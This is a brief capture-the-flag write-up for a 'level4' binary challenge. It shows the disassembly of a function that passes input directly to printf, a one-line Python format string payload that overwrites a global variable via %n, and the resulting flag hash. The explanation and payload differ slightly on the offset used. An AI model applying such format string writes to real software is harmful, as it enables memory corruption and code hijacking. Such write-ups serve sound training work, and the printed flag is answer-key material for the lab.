Same as the last exercice, we need to use `String Format Exploit`, we decompile with `objdump -d level4` :
```asm
08048444 <p>:
 8048444:	55                   	push   %ebp
 8048445:	89 e5                	mov    %esp,%ebp
 8048447:	83 ec 18             	sub    $0x18,%esp
 804844a:	8b 45 08             	mov    0x8(%ebp),%eax
 804844d:	89 04 24             	mov    %eax,(%esp)
 8048450:	e8 eb fe ff ff       	call   8048340 <printf@plt>
 8048455:	c9                   	leave  
 8048456:	c3                   	ret 
```

So we may use `printf` in `p` function to evaluate and change the `eip` register :
At 4th posisition got `41414141` so we replace `AAAA` by the address to change, followed by the padding (60), followed by `%4$n`
<m> is at *0x08049810

```bash
(python -c "print '\x10\x98\x04\x08' + '%x' * 10 + '%16930052x' + '%n'") | ./level4
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```



